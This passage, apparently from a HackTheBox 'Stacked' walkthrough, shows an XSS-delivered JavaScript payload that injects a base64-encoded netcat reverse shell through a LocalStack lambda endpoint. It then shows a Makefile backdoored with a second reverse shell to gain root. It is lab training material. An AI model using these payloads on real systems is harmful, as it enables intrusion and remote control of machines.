aui-header-logo-textonly&quot;</span>&gt;</span><br><span class="line">                        &lt;span class=<span class="string">&quot;aui-header-logo-device&quot;</span>&gt;</span><br><span class="line">                &lt;img src=<span class="string">&quot;img/localstack_small.png&quot;</span> style=<span class="string">&quot;height: 30px; padding: 2px; margin-right: 10px;&quot;</span>/&gt;</span><br><span class="line">              &lt;/span&gt;</span><br><span class="line">          &lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">  &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Content --&gt;</span><br><span class="line">  &lt;section <span class="built_in">id</span>=<span class="string">&quot;content&quot;</span> role=<span class="string">&quot;main&quot;</span> ui-view class=<span class="string">&quot;fullsize&quot;</span> style=<span class="string">&quot;position: absolute; top: 0px; padding-top: 40px; z-index: 1&quot;</span>&gt; &lt;/section&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/jquery/dist/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/dagre/dist/dagre.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/jsplumb/dist/js/jsPlumb-2.1.4.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/swagger-client/browser/swagger-client.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-ui-router/release/angular-ui-router.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-resource/angular-resource.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-sanitize/angular-sanitize.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-tablesort/js/angular-tablesort.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-resizable/angular-resizable.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;node_modules/angular-ui-layout/src/ui-layout.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.urlParam = <span class="keyword">function</span>(name)&#123;</span><br><span class="line">  var results = new RegExp(<span class="string">&#x27;[\?&amp;]&#x27;</span> + name + <span class="string">&#x27;=([^&amp;#]*)&#x27;</span>).<span class="built_in">exec</span>(window.location.href);</span><br><span class="line">  <span class="keyword">if</span> (results==null)&#123;</span><br><span class="line">     <span class="built_in">return</span> null;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">return</span> results[1] || 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- &lt;script src=<span class="string">&quot;js/joint.defs.js&quot;</span>&gt;&lt;/script&gt; --&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;js/app.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;js/services.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;views/infra.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;views/infra.graph.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;views/infra.details.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;views/config.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Getting-reverse-shell"><a href="#Getting-reverse-shell" class="headerlink" title="Getting reverse shell"></a>Getting reverse shell</h1><p>Now I know that localstack is running on the Stacked machine, It‚Äôs time to do OS Command Injection through XSS.</p>
<p>I create revshell.js.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Doing POST request to localstack of Stacked machine.</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">// the <span class="built_in">command</span> injection payload is <span class="string">&#x27;nc 10.10.14.4 4444 -e /bin/bash&#x27;</span></span><br><span class="line">// <span class="built_in">base64</span> your payload</span><br><span class="line">//</span><br><span class="line">// <span class="keyword">then</span> url encode of <span class="string">&quot;echo bmMgMTAuMTAuMTQuNCA0NDQ0IC1lIC9iaW4vYmFzaA== | base64 -d | sh&quot;</span></span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">// The finish payload would be <span class="string">&quot;echo%20bmMgMTAuMTAuMTQuNCA0NDQ0IC1lIC9iaW4vYmFzaA==%20%7C%20base64%20-d%20%7C%20sh&quot;</span></span><br><span class="line">// and put the payload after the semicolon</span><br><span class="line">var target = <span class="string">&#x27;http://localhost:8080/lambda/test;echo%20bmMgMTAuMTAuMTQuNCA0NDQ0IC1lIC9iaW4vYmFzaA==%20%7C%20base64%20-d%20%7C%20sh/code&#x27;</span></span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&quot;POST&quot;</span>, target, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">xhr.send(JSON.stringify(&#123; <span class="string">&quot;awsEnvironment&quot;</span>: <span class="string">&quot;nothing&quot;</span> &#125;));</span><br></pre></td></tr></table></figure>

<p>Now start python listener in port 80 and netcat listener on port 4444.</p>
<p>Execute the xss_curl_cmd, which is basically the request from burp that I convert to curl.</p>
<p>After a few minutes I got a shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># curl -i -s -k -X $&#x27;POST&#x27; \</span></span><br><span class="line">    -H $<span class="string">&#x27;Host: portfolio.stacked.htb&#x27;</span> -H $<span class="string">&#x27;User-Agent: &lt;script src=\&quot;http://10.10.14.4/\&quot;&gt;&lt;/script&gt;&#x27;</span> -H $<span class="string">&#x27;Accept: application/json, text/javascript, */*; q=0.01&#x27;</span> -H $<span class="string">&#x27;Accept-Language: en-US,en;q=0.5&#x27;</span> -H $<span class="string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span> -H $<span class="string">&#x27;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#x27;</span> -H $<span class="string">&#x27;X-Requested-With: XMLHttpRequest&#x27;</span> -H $<span class="string">&#x27;Content-Length: 76&#x27;</span> -H $<span class="string">&#x27;Origin: &lt;script src=\&quot;http://10.10.14.4/\&quot;&gt;&lt;/script&gt;&#x27;</span> -H $<span class="string">&#x27;Referer: &lt;script src=\&quot;http://10.10.14.4/revshell.js\&quot;&gt;&lt;/script&gt;&#x27;</span> \</span><br><span class="line">    --data-binary $<span class="string">&#x27;fullname=test&amp;email=test%40qq.com&amp;tel=138232254773&amp;subject=test&amp;message=test&#x27;</span> \</span><br><span class="line">    $<span class="string">&#x27;http://portfolio.stacked.htb/process.php&#x27;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 14 Feb 2022 06:51:19 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Content-Length: 54</span><br><span class="line">Content-Type: text/json; charset=utf8</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;success&quot;</span>:<span class="string">&quot;Your form has been submitted. Thank you!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.112 - - [14/Feb/2022 01:52:06] <span class="string">&quot;GET /revshell.js HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># nc -lvp 4444</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 10.10.11.112.</span><br><span class="line">Ncat: Connection from 10.10.11.112:37547.</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">bash: /root/.bashrc: Permission denied</span><br><span class="line">bash-5.0$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvp 4444</span><br><span class="line"></span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># stty raw -echo</span></span><br><span class="line"></span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">nc -lvp 4444</span><br><span class="line">            reset</span><br><span class="line">bash-5.0$ <span class="built_in">id</span></span><br><span class="line">uid=1001(localstack) gid=1001(localstack) <span class="built_in">groups</span>=1001(localstack)</span><br><span class="line">bash-5.0$ <span class="built_in">whoami</span></span><br><span class="line">localstack</span><br></pre></td></tr></table></figure>

<p>I can tell that I‚Äôm in docker container.</p>
<p>Looking at the running process I see a make infra running as root.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ <span class="built_in">ls</span> -al /.dockerenv</span><br><span class="line">-rwxr-xr-x    1 root     root             0 Feb 14 01:27 /.dockerenv</span><br><span class="line"></span><br><span class="line">bash-5.0$ ps -aef</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 root      0:00 &#123;docker-entrypoi&#125; /bin/bash /usr/local/bin/docker-entrypoi</span><br><span class="line">   14 root      0:03 &#123;supervisord&#125; /usr/bin/python3.8 /usr/bin/supervisord -c /</span><br><span class="line">   16 root      0:01 <span class="built_in">tail</span> -qF /tmp/localstack_infra.log /tmp/localstack_infra.e</span><br><span class="line">   20 localsta  0:00 bash -c <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$START_WEB</span>&quot;</span> = <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span> <span class="built_in">exit</span> 0; <span class="keyword">fi</span>; make w</span><br><span class="line">   21 root      0:00 make infra</span><br><span class="line">   22 localsta  0:00 make web</span><br><span class="line">   23 root      0:31 python bin/localstack start --host</span><br><span class="line">   24 localsta  0:14 python bin/localstack web</span><br><span class="line">   94 root      0:31 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar</span><br><span class="line">  110 root      0:00 node /opt/code/localstack/localstack/node_modules/kinesali</span><br><span class="line">  350 localsta  0:00 /bin/sh -c &#123; <span class="built_in">test</span> `<span class="built_in">which</span> aws` || . .venv/bin/activate; &#125;; </span><br><span class="line">  356 localsta  0:00 sh</span><br><span class="line">  357 localsta  0:00 /bin/bash</span><br><span class="line">  360 localsta  0:00 python -c import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">  361 localsta  0:00 /bin/bash</span><br><span class="line">  365 localsta  0:00 ps -aef</span><br></pre></td></tr></table></figure>

<p>And Makefile is owned by localstack user, which makes me have access to that file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ <span class="built_in">ls</span> -la</span><br><span class="line">total 180</span><br><span class="line">drwxrwxrwx    1 localsta localsta      4096 Jul 19  2021 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Dec 23  2020 ..</span><br><span class="line">-rw-r--r--    1 root     root         62068 Feb  1  2021 .coverage</span><br><span class="line">drwxr-xr-x    6 localsta localsta      4096 Feb  1  2021 .venv</span><br><span class="line">-rw-rw-r--    1 localsta localsta      8455 Feb  1  2021 Makefile</span><br><span class="line">drwxr-xr-x    2 localsta localsta      4096 Feb  1  2021 bin</span><br><span class="line">drwxr-xr-x    1 localsta localsta      4096 Feb  1  2021 localstack</span><br><span class="line">-rw-r--r--    1 root     root         61864 Feb  1  2021 nosetests.xml</span><br><span class="line">-rw-rw-r--    1 localsta localsta      1529 Feb  1  2021 requirements.txt</span><br><span class="line">-rw-r--r--    1 root     root             3 Feb 14 01:27 supervisord.pid</span><br><span class="line">bash-5.0$ <span class="built_in">whoami</span></span><br><span class="line">localstack</span><br></pre></td></tr></table></figure>

<p>My thought is, I owned Makefile and I see a make infra process is running as root, What if I inject my malicious code (reverse shell) and somehow I can crash or kill the container and make it run the make infra command again as root.</p>
<p>So I get back to localstack github repository to read all the source code or find which code to kill or restart the process without the need of permission.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvY2Fsc3RhY2svbG9jYWxzdGFjaw==">localstack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>After a long read and searching for restart, reboot, shutdown, reset. I eventually found this code.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2147.jpg"></li>
</ul>
<p>The comment said</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Header to indicate that the process should <span class="built_in">kill</span> itself. This is required because</span><br><span class="line"><span class="keyword">if</span> this process is started as root, <span class="keyword">then</span> we cannot <span class="built_in">kill</span> it from a non-root</span><br><span class="line">process.</span><br></pre></td></tr></table></figure>

<p>So I can kill the localstack process by using the x-localstack-kill as request header.</p>
<p>Let‚Äôs put our reverse shell code to Makefile, I need to put the code inside the infra target, put the reverse shell in Makefile line 54.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># cat Makefile  </span></span><br><span class="line">IMAGE_NAME ?= localstack/localstack</span><br><span class="line">IMAGE_NAME_BASE ?= localstack/java-maven-node-python</span><br><span class="line">IMAGE_NAME_LIGHT ?= localstack/localstack-light</span><br><span class="line">IMAGE_NAME_FULL ?= localstack/localstack-full</span><br><span class="line">IMAGE_TAG ?= $(shell <span class="built_in">cat</span> localstack/constants.py | grep <span class="string">&#x27;^VERSION =&#x27;</span> | sed <span class="string">&quot;s/VERSION = [&#x27;\&quot;]\(.*\)[&#x27;\&quot;].*/\1/&quot;</span>)</span><br><span class="line">DOCKER_SQUASH ?= --squash</span><br><span class="line">VENV_DIR ?= .venv</span><br><span class="line">PIP_CMD ?= pip</span><br><span class="line">TEST_PATH ?= .</span><br><span class="line"></span><br><span class="line">ifeq ($(OS), Windows_NT)</span><br><span class="line">        VENV_RUN = . $(VENV_DIR)/Scripts/activate</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        VENV_RUN = . $(VENV_DIR)/bin/activate</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">usage:             <span class="comment">## Show this help</span></span><br><span class="line">        @fgrep -h <span class="string">&quot;##&quot;</span> $(MAKEFILE_LIST) | fgrep -v fgrep | sed -e <span class="string">&#x27;s/\\$$//&#x27;</span> | sed -e <span class="string">&#x27;s/##//&#x27;</span></span><br><span class="line"></span><br><span class="line">setup-venv:</span><br><span class="line">        (<span class="built_in">test</span> `<span class="built_in">which</span> virtualenv` || $(PIP_CMD) install --user virtualenv) &amp;&amp; \</span><br><span class="line">                (<span class="built_in">test</span> -e $(VENV_DIR) || virtualenv $(VENV_OPTS) $(VENV_DIR))</span><br><span class="line"></span><br><span class="line">install-venv:</span><br><span class="line">        make setup-venv &amp;&amp; \</span><br><span class="line">                <span class="built_in">test</span> ! -e requirements.txt || ($(VENV_RUN); $(PIP_CMD) -q install -r requirements.txt)</span><br><span class="line"></span><br><span class="line">init:              <span class="comment">## Initialize the infrastructure, make sure all libs are downloaded</span></span><br><span class="line">        $(VENV_RUN); PYTHONPATH=. <span class="built_in">exec</span> python localstack/services/install.py libs</span><br><span class="line"></span><br><span class="line">init-testlibs:</span><br><span class="line">        $(VENV_RUN); PYTHONPATH=. <span class="built_in">exec</span> python localstack/services/install.py testlibs</span><br><span class="line"></span><br><span class="line">install:           <span class="comment">## Install full dependencies in virtualenv</span></span><br><span class="line">        (make install-venv &amp;&amp; make init-testlibs) || <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line">install-basic:     <span class="comment">## Install basic dependencies for CLI usage in virtualenv</span></span><br><span class="line">        make setup-venv &amp;&amp; \</span><br><span class="line">                ($(VENV_RUN); <span class="built_in">cat</span> requirements.txt | grep -ve <span class="string">&#x27;^#&#x27;</span> | grep <span class="string">&#x27;#\(basic\|extended\)&#x27;</span> | sed <span class="string">&#x27;s/ #.*//&#x27;</span> \</span><br><span class="line">                        | xargs $(PIP_CMD) install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># deprecated - TODO remove</span></span><br><span class="line">install-web:</span><br><span class="line">        (<span class="built_in">cd</span> localstack/dashboard/web &amp;&amp; (<span class="built_in">test</span> ! -e package.json || npm install --silent &gt; /dev/null))</span><br><span class="line"></span><br><span class="line">publish:           <span class="comment">## Publish the library to the central PyPi repository</span></span><br><span class="line">        <span class="comment"># build and upload archive</span></span><br><span class="line">        ($(VENV_RUN) &amp;&amp; ./setup.py sdist upload)</span><br><span class="line"></span><br><span class="line">coveralls:         <span class="comment">## Publish coveralls metrics</span></span><br><span class="line">        ($(VENV_RUN); coveralls)</span><br><span class="line"></span><br><span class="line">infra:             <span class="comment">## Manually start the local infrastructure for testing</span></span><br><span class="line">        nc 10.10.14.4 3344 -e /bin/bash;</span><br><span class="line">        ($(VENV_RUN); <span class="built_in">exec</span> bin/localstack start --host)</span><br><span class="line"></span><br><span class="line">docker-build:      <span class="comment">## Build Docker image</span></span><br><span class="line">        docker build -t $(IMAGE_NAME) .</span><br><span class="line"></span><br><span class="line">docker-squash:</span><br><span class="line">        <span class="comment"># squash entire image</span></span><br><span class="line">        <span class="built_in">which</span> docker-squash || $(PIP_CMD) install docker-squash; \</span><br><span class="line">                docker-squash -t $(IMAGE_NAME):$(IMAGE_TAG) $(IMAGE_NAME):$(IMAGE_TAG)</span><br><span class="line"></span><br><span class="line">docker-build-base:</span><br><span class="line">        docker build $(DOCKER_SQUASH) -t $(IMAGE_NAME_BASE) -f bin/Dockerfile.base .</span><br><span class="line">        docker tag $(IMAGE_NAME_BASE) $(IMAGE_NAME_BASE):$(IMAGE_TAG)</span><br><span class="line">        docker tag $(IMAGE_NAME_BASE):$(IMAGE_TAG) $(IMAGE_NAME_BASE):latest</span><br><span class="line"></span><br><span class="line">docker-build-base-ci:</span><br><span class="line">        DOCKER_SQUASH= make docker-build-base</span><br><span class="line">        IMAGE_NAME=$(IMAGE_NAME_BASE) IMAGE_TAG=latest make docker-squash</span><br><span class="line">        docker info | grep Username || docker login -u <span class="string">&quot;$<span class="variable">$DOCKER_USERNAME</span>&quot;</span> -p <span class="string">&quot;$<span class="variable">$DOCKER_PASSWORD</span>&quot;</span></span><br><span class="line">        docker push $(IMAGE_NAME_BASE):latest</span><br><span class="line"></span><br><span class="line">docker-push:       <span class="comment">## Push Docker image to registry</span></span><br><span class="line">        make docker-squash</span><br><span class="line">        docker push $(IMAGE_NAME):$(IMAGE_TAG)</span><br><span class="line"></span><br><span class="line">docker-push-master:<span class="comment">## Push Docker image to registry IF we are currently on the master branch</span></span><br><span class="line">        (CURRENT_BRANCH=`(git rev-parse --abbrev-ref HEAD | grep <span class="string">&#x27;^master$$&#x27;</span> || ((git branch -a | grep &#x27;HEAD detached at [<span class="number">0</span>-<span class="number">9</span>a-zA-Z]*)&#x27;) &amp;&amp; git branch -a)) | grep <span class="string">&#x27;^[* ]*master$$&#x27;</span> | sed <span class="string">&#x27;s/[* ]//g&#x27;</span> || <span class="literal">true</span>`; \</span><br><span class="line">                <span class="built_in">test</span> <span class="string">&quot;$<span class="variable">$CURRENT_BRANCH</span>&quot;</span> != <span class="string">&#x27;master&#x27;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Not on master branch.&quot;</span>) || \</span><br><span class="line">        ((test &quot;$<span class="variable">$DOCKER_USERNAME</span>&quot; = &#x27;&#x27; || test &quot;$<span class="variable">$DOCKER_PASSWORD</span>&quot; = &#x27;&#x27; ) &amp;&amp; \</span><br><span class="line">                echo &quot;Skipping docker push as no credentials are provided.&quot;) || \</span><br><span class="line">        (REMOTE_ORIGIN=&quot;`git remote -v | grep &#x27;/localstack&#x27; | grep origin | grep push | awk &#x27;&#123;print $<span class="variable">$2</span>&#125;&#x27;`&quot;; \</span><br><span class="line">                test &quot;$<span class="variable">$REMOTE_ORIGIN</span>&quot; != &#x27;https://github.com/localstack/localstack.git&#x27; &amp;&amp; \</span><br><span class="line">                echo &quot;This is a fork and not the main repo.&quot;) || \</span><br><span class="line">        ( \</span><br><span class="line">                which $(PIP_CMD) || (wget https://bootstrap.pypa.io/get-pip.py &amp;&amp; python get-pip.py); \</span><br><span class="line">                docker info | grep Username || docker login -u $<span class="variable">$DOCKER_USERNAME</span> -p $<span class="variable">$DOCKER_PASSWORD</span>; \</span><br><span class="line">                IMAGE_TAG=latest make docker-squash &amp;&amp; make docker-build-light &amp;&amp; \</span><br><span class="line">                        docker tag $(IMAGE_NAME):latest $(IMAGE_NAME_FULL):latest &amp;&amp; \</span><br><span class="line">                        docker tag $(IMAGE_NAME_LIGHT):latest $(IMAGE_NAME):latest &amp;&amp; \</span><br><span class="line">                ((! (git diff HEAD~<span class="number">1</span> localstack/constants.py | grep &#x27;^+VERSION =&#x27;) &amp;&amp; \</span><br><span class="line">                        echo &quot;Only pushing tag &#x27;latest&#x27; as version has not changed.&quot;) || \</span><br><span class="line">                        (docker tag $(IMAGE_NAME):latest $(IMAGE_NAME):$(IMAGE_TAG) &amp;&amp; \</span><br><span class="line">                                docker tag $(IMAGE_NAME_FULL):latest $(IMAGE_NAME_FULL):$(IMAGE_TAG) &amp;&amp; \</span><br><span class="line">                                docker push $(IMAGE_NAME):$(IMAGE_TAG) &amp;&amp; docker push $(IMAGE_NAME_LIGHT):$(IMAGE_TAG) &amp;&amp; \</span><br><span class="line">                                docker push $(IMAGE_NAME_FULL):$(IMAGE_TAG))) &amp;&amp; \</span><br><span class="line">                docker push $(IMAGE_NAME):latest &amp;&amp; docker push $(IMAGE_NAME_FULL):latest &amp;&amp; docker push $(IMAGE_NAME_LIGHT):latest \</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">docker-run:        <span class="comment">## Run Docker image locally</span></span><br><span class="line">        ($(VENV_RUN); bin/localstack start)</span><br><span class="line"></span><br><span class="line">docker-mount-run:</span><br><span class="line">        MOTO_DIR=$$(<span class="built_in">echo</span> $$(<span class="built_in">pwd</span>)/.venv/lib/python*/site-packages/moto | awk <span class="string">&#x27;&#123;print $$NF&#125;&#x27;</span>); <span class="built_in">echo</span> MOTO_DIR $<span class="variable">$MOTO_DIR</span>; \</span><br><span class="line">                ENTRYPOINT=<span class="string">&quot;-v `pwd`/localstack/constants.py:/opt/code/localstack/localstack/constants.py -v `pwd`/localstack/config.py:/opt/code/localstack/localstack/config.py -v `pwd`/localstack/plugins.py:/opt/code/localstack/localstack/plugins.py -v `pwd`/localstack/utils:/opt/code/localstack/localstack/utils -v 